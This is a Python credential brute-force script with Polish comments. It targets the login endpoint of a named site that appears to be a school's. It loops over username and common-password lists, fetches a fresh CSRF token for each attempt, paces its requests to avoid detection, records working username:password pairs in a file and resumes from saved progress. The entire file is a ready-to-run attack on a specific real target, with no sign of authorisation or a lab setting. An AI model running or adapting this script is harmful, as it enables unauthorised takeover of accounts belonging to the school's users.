import os
import time
import requests
from bs4 import BeautifulSoup

# URL strony logowania i endpoint POST
LOGIN_PAGE = "https://szkola.nekla.pl/apps/tncms/login.cms"
LOGIN_POST = "https://szkola.nekla.pl/apps/tncms/login.cms"

# Pliki
LOGIN_FILE = "usernames.txt"
PASSWORD_FILE = "Polish_Pwdb_common-password-list-top-150.txt"
SUCCESS_FILE = "success.brute"
PROGRESS_FILE = "progress.brute"

# Utworzenie sesji
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest"
})

# Wczytanie już znalezionych sukcesów
if os.path.exists(SUCCESS_FILE):
    with open(SUCCESS_FILE, "r") as f:
        known_success = set(line.strip() for line in f)
else:
    known_success = set()

# Wczytanie miejsca wznowienia
last_combo = None
if os.path.exists(PROGRESS_FILE):
    with open(PROGRESS_FILE, "r") as f:
        last_combo = f.read().strip()

def get_csrf_token():
    """Pobranie tokenu CSRF ze strony logowania."""
    try:
        r = session.get(LOGIN_PAGE)
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "csrf_token"})
        if token_input:
            return token_input.get("value")
    except Exception as e:
        print(f"[!] Błąd pobierania CSRF tokenu: {e}")
    return None

def try_login(username, password):
    """Próba logowania z dynamicznym tokenem CSRF."""
    csrf_token = get_csrf_token()
    if csrf_token is None:
        print("[!] Brak CSRF tokenu – pomijam próbę")
        return False

    data = {
        "username": username,
        "password": password,
        "csrf_token": csrf_token
    }

    try:
        start_time = time.time()
        response = session.post(LOGIN_POST, data=data)
        elapsed = time.time() - start_time
        time.sleep(1 + elapsed * 0.5)

        json_resp = response.json()
        if json_resp.get("error") == False:
            print(f"[+] Sukces: {username}:{password}")
            combo = f"{username}:{password}"
            if combo not in known_success:
                with open(SUCCESS_FILE, "a") as f:
                    f.write(combo + "\n")
                known_success.add(combo)
            return True
        else:
            print(f"[-] Nieudane: {username}:{password}")
            return False

    except Exception as e:
        print(f"[!] Błąd w odpowiedzi: {e}")
        return False

# Wczytanie loginów i haseł
with open(LOGIN_FILE, "r") as f:
    logins = [line.strip() for line in f if line.strip()]

with open(PASSWORD_FILE, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# Flaga: wznowienie od ostatniej kombinacji
resume = last_combo is None

for login in logins:
    for password in passwords:
        combo = f"{login}:{password}"
        if combo in known_success:
            continue  # pomijamy już znane sukcesy
        if not resume:
            if combo == last_combo:
                resume = True
            continue
        # zapisanie postępu
        with open(PROGRESS_FILE, "w") as f:
            f.write(combo)
        try_login(login, password)
